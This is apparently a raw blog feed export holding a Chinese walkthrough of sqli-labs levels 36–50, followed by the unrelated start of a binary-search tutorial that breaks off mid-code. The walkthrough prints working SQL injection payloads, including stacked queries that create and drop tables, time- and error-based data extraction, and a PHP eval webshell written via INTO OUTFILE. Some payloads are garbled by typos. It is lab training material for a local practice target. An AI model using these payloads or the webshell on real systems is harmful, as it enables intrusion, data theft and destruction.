class="line">注意：为什么一直强调能够使用十六进制的就使用十六进制，因为本关中单引号全部会被转义</span><br></pre></td></tr></table></figure><p><strong>Notice:</strong><br>在使用<code> mysql_real_escape_string()</code>时， 如何能够安全的防护这种问题， 需要将 <code>mysql </code>设置为<code>gbk </code>即可。<br><strong>设置代码：</strong><br><code>Mysql_set_charset(‘gbk’,’$conn’)  </code></p><h2 id="Less-37-POST-Bypass-MysQL-real-escape-string"><a href="#Less-37-POST-Bypass-MysQL-real-escape-string" class="headerlink" title="Less-37: POST- Bypass MysQL real escape string"></a>Less-37: POST- Bypass MysQL real escape string</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">我们首先测试在POST情况下，传入正确和错误的值回显情况：</span><br><span class="line">1.   admin:admin 正确的密码和账号 --&gt; 返回姓名等常规信息</span><br><span class="line">2.   ad:ad   错误的密码和账号--&gt;返回的是登录失败</span><br><span class="line">3.   与34关基本相似，本关只是将过滤函数进行了替换： mysql_real_escape_string()，同样，我们可以直接按照34关的方法即可！</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>分析</strong>：在get型传参的时候使用URLencode，所以我们可以使用以下两种方法：</p><p><strong>法一：</strong>我们借鉴了将单引号的UTF-8转换为UTF-16的单引号模式 ‘ –&gt; �’<br><strong>法二：</strong>我们使用burpsuite进行抓包之后对数据进行宽字节注入</p><p>详见34</p><p><img src="/2020/07/13/sqlo-labs/image-20200526120144920.png" alt="image-20200526120144920"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Summary:<br>从上面的几关当中， 可以总结一下过滤 <code>‘ \</code> 常用的<strong>三种</strong>方式是直接<code> replace，addslashes(),mysql_real_escape_string()</code>。 三种方式仅仅依靠一个函数是不能完全防御的， 所以我们在编写代码的时候需要考虑的更加仔细。 同时在上述过程中， 我们也给出三种防御的方式， 相信仔细看完已经明白了， 这里就不赘述了。</p><h1 id="Page3-Stacked-injection"><a href="#Page3-Stacked-injection" class="headerlink" title="Page3  Stacked injection"></a>Page3  Stacked injection</h1><h2 id="Less-38：-Future-Editions"><a href="#Less-38：-Future-Editions" class="headerlink" title="Less-38： Future Editions"></a>Less-38： Future Editions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">我们直接构造语句：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-38&#x2F;?id&#x3D;1&#39;; create table crow like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-38&#x2F;?id&#x3D;1&#39;; drop table crow ; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/07/13/sqlo-labs/image-20200526145510213.png" alt="image-20200526145510213"></p><h2 id="Less-39-GET-Stacked-Query-Injection-Intiger-based"><a href="#Less-39-GET-Stacked-Query-Injection-Intiger-based" class="headerlink" title="Less-39: .GET - Stacked Query Injection- Intiger based"></a>Less-39: .GET - Stacked Query Injection- Intiger based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">与less38不相同的地方是sql语句的id值处理：我们将38中的id&#x3D;‘ ’; 修改为id&#x3D; ; 即可</span><br><span class="line">我们直接构造语句：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-39&#x2F;?id&#x3D;1 ; create table crow like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-39&#x2F;?id&#x3D;1 ; drop table crow ; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">与less38、39不相同的地方是这里的错误不会回显，但是不影响我们注入测试，而且我们将id修改为id&#x3D;(‘ ’);</span><br><span class="line">我们直接构造语句：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-40&#x2F;?id&#x3D;1&#39;); create table crow like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-40&#x2F;?id&#x3D;1&#39;); drop table crow ; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">和40关相同，没有回显信息，但是不影响我们注入测试，而且id值没有经过包裹；</span><br><span class="line">我们直接构造语句：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-41&#x2F;?id&#x3D;1 ; create table crow like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-40&#x2F;?id&#x3D;1 ; drop table crow ; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">当我们第一眼看到这个界面的时候，感觉和二次注入是不是有点像，但是这里和二次注入有一点不同：</span><br><span class="line">我们直接来到login.php中，观察username和password的处理问题：</span><br><span class="line">$username &#x3D; mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);  </span><br><span class="line"> $password &#x3D; $_POST[&quot;login_password&quot;];</span><br><span class="line"> </span><br><span class="line">此时的sql为： &quot;SELECT * FROM users WHERE username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;&quot;</span><br><span class="line">我们可以看到password没有经过mysqli_real_escape_string()函数进行处理，所以这个时候我们在这个位置进行构造：</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line">a’; create table crow like users; #   然后观察是否有crow表</span><br><span class="line">a‘;  drop table crow; # 观察crow表是否删除</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">这一关和less42非常像，区别就在于对于id值得处理：</span><br><span class="line">此时的sql为： $sql &#x3D; &quot;SELECT * FROM users WHERE username&#x3D;(&#39;$username&#39;) and password&#x3D;(&#39;$password’)”;</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line">a’); create table crow like users; #   然后观察是否有crow表</span><br><span class="line">a‘);  drop table crow; # 观察crow表是否删除</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">本关和前面的基本是一样的，只是没有报错回显信息</span><br><span class="line">此时的sql为： $sql &#x3D; &quot;SELECT * FROM users WHERE username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;&quot;;</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line">a’; create table crow like users; #   然后观察是否有crow表</span><br><span class="line">a‘;  drop table crow; # 观察crow表是否删除</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">本关和less43关的基本是一样的，只是没有报错回显信息</span><br><span class="line">此时的sql为： $sql &#x3D; &quot;SELECT * FROM users WHERE username&#x3D;(&#39;$username&#39;) and password&#x3D;(&#39;$password’)”;</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line">a’); create table crow like users; #   然后观察是否有crow表</span><br><span class="line">a‘);  drop table crow; # 观察crow表是否删除</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结-堆叠注入写一句话木马"><a href="#总结-堆叠注入写一句话木马" class="headerlink" title="总结_堆叠注入写一句话木马"></a>总结_堆叠注入写一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在上面的关卡中，基本上都是在创建表，删除表，我的操作会让大家感觉堆叠注入好像没有什么太大的用处，我们利用less45来写一个一句话木马：</span><br><span class="line">php一句话木马：&lt;?php   @eval($_POST[crow]); ?&gt;</span><br><span class="line">绝对路径： C:\phpstudy\PHPTutorial\WWW\</span><br><span class="line">使用函数： select xxx into  outfile xxx</span><br><span class="line">select &#39;&lt;?php @eval($_POST[crow]);?&gt;&#39; into outfile &#39;C:\\phpstudy\\PHPTutorial\\WWW\\crow.php&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’   sort的 值我们可以设置1,2,3均可!</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’  desc此时结果以第三列的降序进行排列</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’ asc此时的结果以第 三列的升序进行排列，说明在sort位置存在注入漏洞</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;left(database() ,1 )这里面显示没有什么反应，那么我们尝试使用延时注入或者是报错注入来尝试一下</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>延时注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">法一:延时注入</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’ and if( length(database()&#x3D;1 ),1,sleep(5)) - +判断数据库长度</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’ and if (left( (select schema name from information schema.schemata limit 0,1)，1)&gt;&#39;a&#39; ,1, sleep(5)) -+判断数据库中第一 个库的第一 位的值是否大于a</span><br></pre></td></tr></table></figure><p><strong>报错注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">法二:报错注入</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’ and updatexml( 1, concat( 0x7e, database(), 1) -+爆出当前使用数据库名称</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’ and updatexml(1, concat(0x7e, ( select schema_name from</span><br><span class="line">information. schema.schemata limit 0,1) ) ,1) +爆出数据库中的第一个值， 可以使用遍历的思想去继续操作下去</span><br><span class="line">因为我自己将ppt中后面</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>本关的 sql 语句为<code> $sql = &quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;</code>将 id 变为字符型， 因此根据我们上述提到的知识， 我们依旧按照<strong>注入的位置</strong>进行分类。<br><strong>（1）  order by 后的参数</strong><br>我们只能使用 <code>and </code>来进行<code>报错和延时注入</code>。 我们下面给出几个 payload 示例。<br><strong>①</strong> <code>and rand </code>相结合的方式， <strong>payload</strong>：<code>http://127.0.0.1/sqli-labs/Less-47/index.php?sort=1%27and%20rand(ascii(left(database(),1))=115)--+ </code>,换成 116 后，<code>http://127.0.0.1/sqli-labs/Less-47/index.php?sort=1%27and%20rand(ascii(left(database(),1))=116)--+ </code>.此处后期经过测试， 还是存在问题的， 我们不能使用这种方式进行准确的注入。  </p><p><strong>②</strong>可以利用<strong>报错的方式</strong>进行<br><code>http://127.0.0.1/sqli-labs/Less-47/?sort=1%27and%20(select%20count(*)%20from%20informati on_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand()*2)))--+  </code></p><p>可以看到 user()的内容， 同时可以构造其他的语句进行注入。<br>这里再放一个报错注入， 原理和上面的 payload 是一样的， 都是利用的 mysql <strong>重复项</strong>的原理。<code>http://127.0.0.1/sqli-labs/Less-47/?sort=1%27and%20(select%20*%20from%20(select%20NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+</code>此处重复了 <code>version()</code>,所以就爆出了版本号  </p><p><strong>③延时注入</strong><br><code>http://127.0.0.1/sqli-labs/Less-47/?sort=1%27and%20If(ascii(substr(database(),1,1))=115,0,sleep(5))--+</code><br>这里因 database()为 security， 所以第一个字母的 s 的 ascii 为 115， 此处直接显示， 当改为116 或者其他的数字的时候， 就要延时了， 我们这里就不贴图展示了， 可以通过脚本爆破。  </p><p><strong>（2） procedure analyse 参数后注入</strong><br>利用 procedure analyse 参数， 我们可以执行报错注入。 同时， 在 procedure analyse 和 order by 之间可以存在 limit 参数， 我们在实际应用中， 往往也可能会存在 limit 后的注入， 可以利用 procedure analyse 进行注入。</p><p><code>http://127.0.0.1/sqli-labs/Less-47/?sort=1%27procedure%20analyse(extractvalue(rand(),concat (0x3a,version())),1)--+  </code>  </p><p><strong>（4） 导入导出文件 into outfile 参数</strong>  </p><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>报错注入不能使用， 不进行错误回显  ,我们使用时间注入，可以利用 sort=rand(true/false)进行判断  </p><p><code>http://127.0.0.1/sqli-labs/Less-48/?sort=rand(ascii(left(database(),1))=178)  </code></p><p><strong>And 后的延时注入</strong><br><code>http://127.0.0.1/sqli-labs/Less-48/?sort=1%20and%20(If(ascii(substr(database(),1,1))=115,0,sleep(5)))  </code></p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>本关与 47 关基本类似， 区别在于没有错误回显， 所以我们可以通过延时注入和导入文件进行注入。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在less46- 49关中，我们通过对order by存在的注入部分进行了简单的分析，我们思考在这几关卡中能有其他的方法吗?</span><br><span class="line">1.我们利用在less45关写一句话的方法，类比将查询结果写到一个文件中:</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-49&#x2F;?sort&#x3D;0&#39; into outfile &#39;C:lphpstudy\PHPTutoralAWWW\crow.txt’ --+</span><br><span class="line">2.我们写一句话木马:</span><br><span class="line">php-句话木马: &lt;?php @eval($_ POST&#39;crow]); ?&gt;</span><br><span class="line">绝对路径: C:\phpstudy\PHPTutoriaNWWW\</span><br><span class="line">使用函数: select Xx into outfile xxx</span><br><span class="line">select &#39;&lt;?php @eval(S_ POST[crow]);?&gt;&#39; into utfile C:\pstudy\PHPTutoriaNWWW\crow.pbp&#39;(不要直接复制，自己照</span><br><span class="line">着打)</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less- 49&#x2F;?sort&#x3D;0 and (select ‘&lt;php @eval($_POST[‘crow’];?&gt;’) into  outile C:\phpstudy\PHPTutorialNWWW\crow.php’ -+ (注意这个地方是有括号的， 他和以前的不一样)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>执行 sql 语句我们这里使用的是 <code>mysqli_multi_query()</code>函数， 而之前我们使用的是<code> mysqli_query()</code>， 区别在于 <code>mysqli_multi_query()</code>可以执行多个 sql 语句， 而 <code>mysqli_query()</code>只能执行一个 sql 语句， 那么我们此处就可以执行多个 sql 语句进行注入， 也就是我们之前提到的<code> statcked injection</code>。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入: </span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">我们直接看源码中的sql语句  SEL ECT * FROM users ORDER BY 1</span><br><span class="line">这个貌似和前面的都是相同的，但是我们通过源码观察可知:</span><br><span class="line">在本关中使用了mysgli multi guery()函数 (https:&#x2F;&#x2F;www.runoob.com&#x2F;php&#x2F;func-mysqli-multi-query.html)</span><br><span class="line">而在less46-49关中使用了mysqL fetch_assoc()函数(https:&#x2F;&#x2F;www.runoob.com&#x2F;php&#x2F;func-myslifetch-assoc.html)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以这里的不同点就在于本关可以使用<strong>堆叠注入</strong>的形式，我们可以使用以下几种方法:</p><p><strong>基于时间的盲注</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-50&#x2F;?sort&#x3D;1 and if ( (length(database()&gt;1) ,1, sleep(5) )-+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>基于报错往入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-50&#x2F;?sort&#x3D;1 and updatexml( 1, concat(0x7e, (database()) ) ,1) -+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>写一句话木马</strong></p><p><strong>使用迭代注入创建删除一个表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less 50&#x2F;?sort&#x3D;1; create table crow like users; +</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less -50&#x2F;?sort&#x3D;1; drop table crow;-+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>使用对叠注入写一句话木马(</strong></p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分治算法</title>
      <link href="/2019/10/14/%E5%88%86%E6%B2%BB%E7%AE%97%E6%B3%95/"/>
      <url>/2019/10/14/%E5%88%86%E6%B2%BB%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>分治算法的<strong>基本思想</strong>是：将一个计算复杂的问题分为规模较小,计算简单的小问题求解,然后综合各个小问题,而得到最终问题的答案。分治算法的执行过程如下:<a id="more"></a></p><p> （1）<strong>分解</strong>：将原问题分解为若干个规模较小，相互独立，与原问题形式相同的子问题。<br> （2）<strong>求解</strong>：若子问题规模较小而容易被解决则直接解，否则递归地解各个子问题。<br> （3）<strong>合并</strong>：将各个子问题的解合并为原问题的解。</p><p>当我们将 大问题分解成子问题后，经常会发现子问题与大问题本质上是相同的问题，因此可以利用<strong>递 归方法</strong>来设计算法。所以，分治法常常与递归法结合起来使用。</p><p><img src="/2019/10/14/%E5%88%86%E6%B2%BB%E7%AE%97%E6%B3%95/1570960847570.png"></p><blockquote><p>分治算法通常以数学归纳法来验证。而它的计算成本则多数以解递归关系式来判定。</p></blockquote><p>在使用分治法时,使用递归算法是解决问题的利器.下面我们用二分搜索,这个最典型的分治问题来举例,看看分治算法是如何进行工作的.</p><h2 id="二分搜索——猜数问题"><a href="#二分搜索——猜数问题" class="headerlink" title="二分搜索——猜数问题"></a>二分搜索——猜数问题</h2><p>我们一定都玩过猜数游戏,现在我们两个人玩这个游戏,我在我的手心写一个100以内的整数,并且只能给你大了或小了的提示,并且只有三次机会,那如何才能以最快的速度猜出来呢?</p><p><strong>解题思路:</strong><br>从问题的描述来看,如果是n个数,最坏的情况我们得猜n次才可以成功,其实我们没有必要非得一个个的去猜,这显然是一个笨方法。因为这些数是有序的,我们可以按照<strong>折半查找</strong>的方式,每次和中间的元素去比较,如果每次比中间的部分大,去后半部分找,比中间部分小,去后半部分找.</p><p>那我们现在思路有了,可以将<strong>问题抽象描述</strong>出来:</p><p><code>给定n个元素,假设这些元素是有序的,从中查找特定元素x.</code></p><p><strong>解题思想:</strong></p><p>将有序序列先大致分为数目相等的两组,然后取<strong>中间</strong>的元素与<strong>特定</strong>的查找元素进行比较</p><ul><li>如果x<strong>等于</strong>中间元素,查找<strong>成功</strong></li><li>如果x<strong>小于</strong>中间元素,在前半部分继续执行分解和治理操作</li><li>如果x<strong>大于</strong>中间元素,去后半部分进行分解和治理.</li></ul><p><strong>算法设计:</strong><br>使用一维数组S[]放置该<strong>有序序列</strong>,设置变量low和high表示查找的上下界,middle表示中间的位置,x为特定的查找元素.</p><p>1:初始化.令<code>low=0</code>(S[]中的第一位数),<code>high=n-1</code>(S[]中最后一位数).</p><p>2:<code>middle = (low+high)/2</code>,表示中间的查找范围.</p><p>3:判断<code>low&lt;high</code>是否成立,如果成立,继续下一步,否则结束.</p><p>4:判断x与S[middle]的关系,如果两者相同,算法结束,输出结果,否则,如果<code>x&gt;S[middle],low = middle+1</code>,如果<code>x&lt;S[middle]</code>,则<code>high = middle-1.</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>cpp    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">int</span> x, n, i;</span><br><span class="line"><span class="keyword">int</span> s[M];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinarySearch</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> s[], <span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * @file:本文件</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    * briedf: 